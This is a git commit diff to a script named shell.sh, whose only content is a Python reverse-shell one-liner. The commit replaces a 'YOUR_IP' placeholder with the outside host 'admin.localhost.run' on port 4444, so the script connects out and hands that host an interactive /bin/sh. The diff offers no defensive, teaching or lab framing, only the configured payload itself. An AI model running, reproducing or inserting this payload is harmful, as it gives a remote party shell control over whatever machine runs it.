7b741d30f153bae8f0b9457130b19db945fb78b3
Anshul Ola <63150349+anshulola@users.noreply.github.com>
2026-04-06 21:48:56 +0530

    Update shell.sh

--- shell.sh
+++ shell.sh
@@ -1,2 +1,2 @@
 #!/bin/bash 
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("admin.localhost.run",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
